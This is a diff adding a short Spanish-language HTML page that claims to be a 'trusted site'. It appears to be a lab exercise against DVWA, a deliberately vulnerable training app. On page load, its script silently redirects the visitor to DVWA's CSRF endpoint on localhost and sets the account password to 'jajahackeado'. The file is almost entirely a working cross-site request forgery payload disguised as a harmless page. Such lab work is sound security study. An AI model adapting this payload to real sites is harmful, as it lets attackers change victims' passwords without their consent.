@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sitio "Confiable"</title>
+</head>
+<body>
+    <h1>Este es un sitio confiable...</h1>
+    <script>
+        // Primera redirección (ataque CSRF en DVWA)
+        window.location.replace('http://localhost/DVWA/vulnerabilities/csrf/?password_new=jajahackeado&password_conf=jajahackeado&Change=Change');
+    </script>
+</body>
+</html>
